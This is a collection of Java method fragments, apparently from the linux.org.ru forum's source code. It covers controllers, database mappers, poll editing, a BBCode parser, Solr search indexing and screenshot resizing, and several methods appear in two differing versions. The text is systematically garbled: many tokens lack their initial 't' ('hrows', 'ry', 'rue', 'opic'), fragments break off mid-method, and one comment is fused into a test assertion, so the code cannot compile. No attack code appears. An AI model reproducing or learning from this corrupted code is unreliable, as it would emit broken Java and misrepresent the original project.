public ModelAndView viewVote ( @RequestParam ( " vote " ) int voteid ) hrows Exception { Poll poll = pollDao . getPoll ( voteid ) ; return new ModelAndView ( new RedirectView ( " /jump-message.jsp?msgid= " + poll . getTopicId ( ) ) ) ; } 
public void updateVotes ( final int voteId , final int votes [ ] , final User user ) hrows BadVoteException { ry { jdbcTemplate . queryForInt ( queryVotes , voteId , user . getId ( ) ) ; 
public Poll getPollByTopicId ( int opicId ) hrows PollNotFoundException { return getPoll ( getPollId ( opicId ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , userDao . getIgnoreList ( userDao . getUser ( mpl . getCurrentUser ( ) . getId ( ) ) ) ) ; } mv . getModel ( ) . put ( " userInfoText " , userDao . getUserInfo ( user ) ) ; return mv ; } 
public UserInfo mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new UserInfo ( resultSet ) ; } 
public BanInfo mapRow ( ResultSet resultSet , int i ) hrows SQLException { Timestamp date = resultSet . getTimestamp ( " bandate " ) ; String reason = resultSet . getString ( " reason " ) ; User moderator ; ry { moderator = getUser ( resultSet . getInt ( " ban_by " ) ) ; } catch ( UserNotFoundException exception ) { hrow new SQLException ( exception . getMessage ( ) ) ; } return new BanInfo ( date , reason , moderator ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . put ( resultSet . getString ( " pname " ) , resultSet . getInt ( " c " ) ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . put ( resultSet . getInt ( " ignored " ) , resultSet . getString ( " nick " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , userDao . getIgnoreList ( userDao . getUser ( mpl . getCurrentUser ( ) . getId ( ) ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : HTMLFormatter . nl2br ( userinfo ) ) ; return mv ; } 
public List < Timestamp > mapRow ( ResultSet resultSet , int i ) hrows SQLException { return ImmutableList . of ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public String ags ( ) hrows Exception { return " ags " ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . put ( resultSet . getString ( " value " ) , resultSet . getInt ( " counter " ) ) ; } 
public String oldTags ( ) hrows Exception { return " redirect:/tags " ; } 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int opics , int offset , final boolean readMessage ) { String queryString ; if ( showPrivate ) { queryString = queryAllRepliesForUser ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
public void resetUnreadReplies ( User user ) { jdbcTemplate . update ( updateResetUnreadReplies , user . getId ( ) ) ; } 
public List < Timestamp > mapRow ( ResultSet resultSet , int i ) hrows SQLException { return Lists . newArrayList ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public void checkDuplication ( String ip , boolean rusted , Errors errors ) { if ( ! check ( ip , rusted ) ) { errors . reject ( null , MESSAGE ) ; 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . setOutputLorcode ( rue ) ; if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
private static String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Group . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( groupDao . getGroup ( Integer . parseInt ( ext ) ) ) ; 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddMessageRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return AddMessageRequest . class . equals ( clazz ) ; } 
public void copyScreenshotFromPreview ( Template mpl , int msgid ) hrows IOException , UtilException { initFiles ( Integer . oString ( msgid ) , mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " ) ; doResize ( ) ; } 
private void doResize ( ) hrows IOException , UtilException { file . renameTo ( mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public void copyScreenshot ( Template mpl , String sessionId ) hrows IOException , UtilException { initFiles ( sessionId , mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " ) ; doResize ( ) ; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = ext ; str = escapeHtmlBBcode(text); } else { str = htmlSpecialChars(text); } StringTokenizer st = new StringTokenizer(str, " ", true); StringBuilder sb = new StringBuilder(); while (st.hasMoreTokens()) { sb.append(formatHTMLLine(st.nextToken())); } String res = sb.toString(); if (newLine) { res = nl2br(res, quoting, outputLorcode); } if (texNewLine) { res = texnl2br(res, quoting, outputLorcode); } return res; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = ext . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; str = escapeHtmlBBcode(text); } else { str = htmlSpecialChars(text); } StringTokenizer st = new StringTokenizer(str, " ", true); StringBuilder sb = new StringBuilder(); while (st.hasMoreTokens()) { sb.append(formatHTMLLine(st.nextToken())); } String res = sb.toString(); if (newLine) { res = nl2br(res, quoting, outputLorcode); } if (texNewLine) { res = texnl2br(res, quoting, outputLorcode); } return res; } 
public static EditInfoDTO createFromMessage ( Connection db , Message message ) hrows SQLException { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . oString ( TagDao . getMessageTags ( db , message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
private boolean equalStrings ( String s1 , String s2 ) { if ( Strings . isNullOrEmpty ( s1 ) ) { return Strings . isNullOrEmpty ( s2 ) ; } return s1 . equals ( s2 ) ; } 
private static boolean equalStrings ( String s1 , String s2 ) { if ( Strings . isNullOrEmpty ( s1 ) ) { return Strings . isNullOrEmpty ( s2 ) ; } return s1 . equals ( s2 ) ; } 
public static String checkAndFixURL ( String url ) hrows BadURLException { url = url . rim ( ) ; if ( isUrl ( url ) ) { if ( url . oLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . oLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } hrow new BadURLException ( url ) ; } 
public static String fixURL ( String url ) { url = url . rim ( ) ; if ( isUrl ( url ) ) { if ( url . oLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . oLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } return url ; } 
private static int getCurrentPollId ( Connection db ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=votenames.topic AND topics.moderate = 't' AND topics.deleted = 'f' AND topics.commitdate = (select max(commitdate) from topics where groupid=19387 AND moderate AND NOT deleted) " ) ; return rs . next ( ) ? rs . getInt ( " id " ) : 0 ; } 
public Poll get ( ) hrows Exception { return pollDao . getCurrentPoll ( ) ; } 
private int allocateMsgid ( ) { return jdbcTemplate . queryForInt ( " select nextval('s_msgid') as msgid " ) ; } 
public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , request . getHeader ( " User-Agent " ) ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public String doInConnection ( Connection db ) hrows SQLException , DataAccessException { TagDao . updateTags ( db , msgid , ags ) ; TagDao . updateCounters ( db , Collections . < String > emptyList ( ) , ags ) ; return null ; } 
public void createPoll ( final List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( " INSERT INTO votenames (id, multiselect, topic) values (?,?,?) " , voteid , multiSelect , msgid ) ; ry { final Poll poll = getPoll ( voteid ) ; 
public String doInConnection ( Connection db ) hrows SQLException , DataAccessException { for ( String variant : pollList ) { if ( variant . rim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } return null ; } 
public void prepareMessageTest ( ) { ImmutableList < String > ags = ImmutableList . of ( " one " , " wo " ) ; Message message = mock ( Message . class ) ; PollDao pollDao = mock ( PollDao . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDao . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; MessageDao messageDao = mock ( MessageDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . henReturn ( 13 ) ; group id 13 
private String processUploadImage ( HttpServletRequest request , Template mpl ) hrows IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " preview " , " " , new File ( mpl . getObjectConfig ( ) . getPathPrefix ( ) + " /linux-storage/tmp/ " ) ) ; String image = uploadedFile . getPath ( ) ; if ( ( uploadedFile . canWrite ( ) | | uploadedFile . createNewFile ( ) ) ) { ry { logger . debug ( " Transfering upload to: " + image ) ; multipartFile . ransferTo ( uploadedFile ) ; return image ; } catch ( Exception e ) { hrow new ScriptErrorException ( " Failed to write uploaded file " , e ) ; } } else { logger . info ( " Bad target file name: " + image ) ; } } } return null ; } 
public Message get ( ) hrows SQLException , MessageNotFoundException { return messageDao . getById ( poll . getTopicId ( ) ) ; } 
public Screenshot moveTo ( String dir , String name ) hrows IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; FileUtils . moveFile ( mainFile , dest . mainFile ) ; FileUtils . moveFile ( iconFile , dest . iconFile ) ; FileUtils . moveFile ( mediumFile , dest . mediumFile ) ; return dest ; } 
private void doResize ( File uploadedFile ) hrows IOException , UtilException { FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
private static short shortBigEndian ( byte firstRead , byte lastRead ) { return ( short ) ( ( ( firstRead & 0xFF ) < < 8 ) | lastRead & 0xFF ) ; } 
private static short shortLittleEndian ( byte firstRead , byte lastRead ) { return shortBigEndian ( lastRead , firstRead ) ; } 
private static int intBigEndian ( byte a1 , byte a2 , byte a3 , byte a4 ) { return ( ( a1 & 0xFF ) < < 24 ) | ( ( a2 & 0xFF ) < < 16 ) | ( ( a3 & 0xFF ) < < 8 ) | a4 & 0xFF ; } 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new DeleteInfo ( resultSet . getString ( " nick " ) , 
public RootNode parse ( String bbcode ) { RootNode rootNode = new RootNode ( parserParameters ) ; rootNode . setRenderOptions ( rue , rue , " " ) ; return parse ( rootNode , bbcode ) ; } 
public RootNode parse ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = new RootNode ( parserParameters ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; return parse ( rootNode , bbcode ) ; } 
public Set < String > getAllowedListParameters ( ) ; public Set < String > getBlockLevelTags ( ) ; public Map < String , Tag > getAllTagsDict ( ) ; public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getBlockLevelTags ( ) ; public Map < String , Tag > getAllTagsDict ( ) ; public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Map < String , Tag > getAllTagsDict ( ) ; public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public static String bb2xhtml ( String bbcode ) { return defaultParser . parse ( bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { UserDao singleUserDao = new UserDao ( ) ; singleUserDao . setJdbcTemplate ( new SingleConnectionDataSource ( db , rue ) ) ; return bb2xhtml ( bbcode , renderCut , cleanCut , cutUrl , singleUserDao ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { return defaultParser . parse ( bbcode , renderCut , cleanCut , cutUrl , userDao ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl ) { return defaultParser . parse ( bbcode , renderCut , cleanCut , cutUrl , null ) . renderXHtml ( ) ; } 
public static ParserResult bb2xhtm ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = defaultParser . parse ( bbcode , renderCut , cleanCut , cutUrl , userDao ) ; String html = rootNode . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
public boolean allows ( String agname ) { return parserParameters . getBlockLevelTags ( ) . contains ( agname ) ; } 
public String parser ( String lorcode ) { return defaultParser . parse ( lorcode ) . renderXHtml ( ) ; } 
public String parser ( String lorcode , boolean renderCut , boolean cleanCut , String cutUrl ) { return defaultParser . parse ( lorcode , renderCut , cleanCut , cutUrl , userDao ) . renderXHtml ( ) ; } 
public ParserResult parserWithReplies ( String lorcode ) { RootNode rootNode = defaultParser . parse ( lorcode ) ; String html = rootNode . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
public ParserResult parserWithReplies ( String lorcode , boolean renderCut , boolean cleanCut , String cutUrl ) { RootNode rootNode = defaultParser . parse ( lorcode , renderCut , cleanCut , cutUrl , userDao ) ; String html = rootNode . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; doc . addField ( " message " , StringEscapeUtils . unescapeHtml ( opic . getMessage ( ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . addField ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , StringEscapeUtils . unescapeHtml ( message ) ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . addField ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } mpl . getCurrentUser ( ) . checkDelete ( ) ; Calendar current = Calendar . getInstance ( ) ; for ( int i = 0 ; i < 3 ; i + + ) { searchQueueSender . updateMonth ( current . get ( Calendar . YEAR ) , current . get ( Calendar . MONTH ) + 1 ) ; current . add ( Calendar . MONTH , - 1 ) ; } return new ModelAndView ( " action-done " , " message " , " Scheduled reindex last 3 month " ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) hrows SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; solrServer . commit ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(commentDao, msg, true); 
public void handleMessage ( SearchQueueSender . UpdateMonth msgUpdate ) hrows SQLException , MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = messageDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
public Integer mapRow ( ResultSet resultSet , int i ) hrows SQLException { return resultSet . getInt ( " id " ) ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { jdbcTemplate . update ( insertDelinfo , msgid , user . getId ( ) , reason + " ( " + scoreBonus + ')' ) ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getById ( Integer . parseInt ( ext ) ) ) ; 
private void doResize ( File uploadedFile ) hrows IOException , UtilException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public ModelAndView opics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) hrows Exception { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . oString ( ) ) ) ; 
public ModelAndView opicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) hrows Exception { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . oString ( ) + " &lastmod=true " ) ) ; 
public Group getGroup ( Section section , String name ) hrows BadGroupException { ry { int id = jdbcTemplate . queryForInt ( " SELECT id FROM groups WHERE section=? AND urlname=? " , section . getId ( ) , name ) ; 
public int calcTopicsCount ( Group group , boolean showDeleted ) hrows SQLException { String query = " SELECT count(topics.id) " + " FROM topics WHERE " + ( group . isModerated ( ) ? " moderate AND " : " " ) + " groupid=? " ; if ( ! showDeleted ) { query + = " AND NOT topics.deleted " ; } List < Integer > res = jdbcTemplate . queryForList ( query , Integer . class , group . getId ( ) ) ; if ( ! res . isEmpty ( ) ) { return res . get ( 0 ) ; 
public void processRow ( ResultSet resultSet ) hrows SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } 
public void updateCurrentUser ( Connection db ) { initCurrentUser ( db , rue ) ; } 
private void initCurrentUser ( Connection db , boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } ry { currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Message msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(commentDao, msg, true); 
public String oldTags ( ) { return " redirect:/tags " ; } 
public Message get ( ) hrows MessageNotFoundException { return messageDao . getById ( poll . getTopicId ( ) ) ; } 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public ModelAndView showForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " msgid " , msgid ) ; Poll poll = pollDao . getPollByTopicId ( msgid ) ; params . put ( " poll " , poll ) ; Message msg = messageDao . getById ( msgid ) ; params . put ( " msg " , msg ) ; List < PollVariant > variants = pollDao . getPollVariants ( poll , Poll . ORDER_ID ) ; params . put ( " variants " , variants ) ; return new ModelAndView ( " edit-vote " , params ) ; } 
public ModelAndView editVote ( HttpServletRequest request , @RequestParam int msgid , @RequestParam int id , @RequestParam String itle , @RequestParam ( defaultValue = " false " ) boolean multiSelect ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; Poll poll = pollDao . getPollByTopicId ( msgid ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private ModelAndView prepareModel ( PreparedMessage preparedMessage ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = preparedMessage . getGroup ( ) ; params . put ( " group " , group ) ; params . put ( " groups " , groupDao . getGroups ( preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = messageDao . getEditInfo ( message . getId ( ) ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " opTags " , agDao . getTopTags ( ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public void processRow ( ResultSet rs ) hrows SQLException { set . add ( rs . getString ( " value " ) ) ; } 
